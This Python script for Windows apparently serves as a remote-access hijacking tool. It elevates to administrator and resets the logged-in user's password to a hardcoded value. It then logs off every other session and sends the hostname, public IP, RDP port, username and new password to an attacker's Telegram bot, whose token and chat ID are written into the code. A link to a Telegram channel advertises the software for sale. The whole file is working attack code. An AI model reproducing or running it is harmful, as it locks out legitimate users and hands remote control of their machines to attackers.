
import os, sys, time, getpass, subprocess, ctypes, socket, ipaddress, urllib.request, urllib.parse, urllib.error, html, winreg
from pathlib import Path
try:
    import certifi
    os.environ.setdefault('SSL_CERT_FILE', certifi.where())
except Exception:
    pass
TELEGRAM_BOT_TOKEN = "6771252530:AAEZNJRinI1JaN2bQuJkP_gSq_iqkcDSDPQ"
TELEGRAM_CHAT_ID = "6824666951"
DEFAULT_NEW_PASSWORD = "@Its_bad0_0_boy"
LOG_PATH = Path("telegram_send.log")
def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False
def elevate_and_exit():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 1)
    sys.exit(0)
def public_ip(timeout=5):
    urls = ["https://api.ipify.org","https://ipv4.icanhazip.com","https://ifconfig.me/ip"]
    for url in urls:
        try:
            with urllib.request.urlopen(url, timeout=timeout) as resp:
                ip = resp.read().decode().strip()
                ipaddress.ip_address(ip)
                return ip
        except Exception:
            continue
    return "Unknown-IP"
def rdp_port():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp") as key:
            val, _ = winreg.QueryValueEx(key, "PortNumber")
            if isinstance(val, int):
                return val
    except Exception:
        pass
    return 3389
def set_password(username, password):
    return subprocess.run(["net", "user", username, password], capture_output=True, text=True)
def _write_log(msg):
    try:
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {msg}\n")
    except Exception:
        pass
def send_telegram(token, chat_id, text, tries=3, timeout=10):
    if not token or not chat_id:
        err = "Missing Telegram token or chat_id"
        print(err)
        _write_log(err)
        return False, err
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": str(chat_id), "text": text, "disable_web_page_preview": "true", "parse_mode": "HTML"}
    body_bytes = urllib.parse.urlencode(data).encode("utf-8")
    last_err = None
    for attempt in range(1, tries + 1):
        try:
            req = urllib.request.Request(url, data=body_bytes, method="POST")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = getattr(resp, "status", None) or resp.getcode()
                resp_body = resp.read().decode(errors="ignore")
                msg = f"[Telegram] Attempt {attempt} HTTP {status} | Response: {resp_body}"
                print(msg)
                _write_log(msg)
                if 200 <= status < 300:
                    return True, resp_body
                last_err = f"HTTP {status} {resp_body}"
        except urllib.error.HTTPError as he:
            try:
                body = he.read().decode(errors="ignore")
            except Exception:
                body = "<no-body>"
            msg = f"[Telegram] Attempt {attempt} HTTPError {he.code} | {body}"
            print(msg)
            _write_log(msg)
            last_err = f"HTTPError {he.code}: {body}"
        except urllib.error.URLError as ue:
            msg = f"[Telegram] Attempt {attempt} URLError: {ue}"
            print(msg)
            _write_log(msg)
            last_err = str(ue)
        except Exception as e:
            msg = f"[Telegram] Attempt {attempt} Exception: {e}"
            print(msg)
            _write_log(msg)
            last_err = str(e)
        if attempt < tries:
            time.sleep(1.0)
    return False, last_err
def list_sessions():
    try:
        out = subprocess.check_output(["query", "session"], stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        out = e.output or ""
    sessions = []
    for line in out.splitlines():
        if not line.strip():
            continue
        cur = False
        raw = line
        if raw.startswith(">"):
            cur = True
            raw = raw[1:]
        parts = raw.split()
        sid = None
        for p in parts:
            if p.isdigit():
                sid = p
                break
        username = ""
        state = ""
        if sid:
            try:
                idx = parts.index(sid)
                if idx - 1 >= 0:
                    username = parts[idx - 1]
                if idx + 1 < len(parts):
                    state = parts[idx + 1]
            except Exception:
                pass
        sessions.append({"raw": line.rstrip(), "id": sid, "username": username, "state": state, "current": cur})
    return sessions
def logoff_session(sid):
    try:
        r = subprocess.run(["logoff", str(sid)], capture_output=True, text=True)
        return r.returncode == 0, r.stdout.strip() or r.stderr.strip()
    except Exception as e:
        return False, str(e)
if __name__ == "__main__":
    if not is_admin():
        elevate_and_exit()
    username = getpass.getuser()
    new_password = DEFAULT_NEW_PASSWORD
    ip = public_ip()
    port = rdp_port()
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    host = socket.gethostname()
    res = set_password(username, new_password)
    if res.returncode == 0:
        status_line = "🔐 <b>Success Changed Key</b>"
    else:
        status_line = "❌ <b>Failed to Change Key</b>"
    out = (res.stdout or "").strip()
    err = (res.stderr or "").strip()
    extra = ""
    if res.returncode != 0:
        msg_snip = (out or err)[:800].replace("<", "&lt;").replace(">", "&gt;")
        extra = f"\n<code>{msg_snip}</code>"
    disconnected_info = ""
    if res.returncode == 0:
        sessions = list_sessions()
        cur_session_ids = [s["id"] for s in sessions if s["current"] and s["id"]]
        disconnected = []
        for s in sessions:
            sid = s["id"]
            if not sid:
                continue
            if sid in cur_session_ids:
                continue
            ok, msg = logoff_session(sid)
            disconnected.append({"id": sid, "username": s.get("username"), "ok": ok, "msg": msg})
            time.sleep(0.2)
        if disconnected:
            lines = []
            for d in disconnected:
                lines.append(f"ID={d['id']} user={d.get('username') or '-'} ok={d['ok']} msg={d['msg']}")
            disconnected_info = "\n\n😈 Disconnected Sessions:\n" + "\n".join(lines)
            _write_log("😈 Disconnected Sessions: " + "; ".join([f"ID={d['id']} ok={d['ok']}" for d in disconnected]))
        else:
            disconnected_info = "\n\nNo other sessions found to disconnect."
            _write_log("No other sessions to disconnect")
    text = (
        f"========[ 🚨 NEW LOGIN PATCH 🚨]========\n"
        f"🤖 Hostname : {html.escape(host)}\n"
        f"🌐 RDP IP : {html.escape(ip)}:{port}\n"
        f"👤 RDP USERNAME : {html.escape(username)}\n"
        f"🔑 RDP Password : {html.escape(new_password)}\n"
        f"🕒 Time : {ts}\n\n"
        f"🛒 Get Another Software : https://t.me/xploitpriv\n"
        f"{extra}"
        f"{disconnected_info}\n"
        f"========[ 🌐 Copyright : www.codefam.co 🌐]========\n"
    )
    ok, err_msg = send_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, text, tries=3, timeout=10)
    if ok:
        print(f"[{ts}] Password for '{username}' set to '{new_password}'. Telegram notification sent.")
    else:
        print(f"[{ts}] Password operation done but Telegram send failed: {err_msg}")
        print("Check telegram_send.log for details.")
        if res.returncode == 0:
            print(f"[+] Password for '{username}' set to '{new_password}'.")
        else:
            print("[!] Password change failed.")
            if out:
                print("— stdout —")
                print(out)
            if err:
                print("— stderr —")
                print(err)

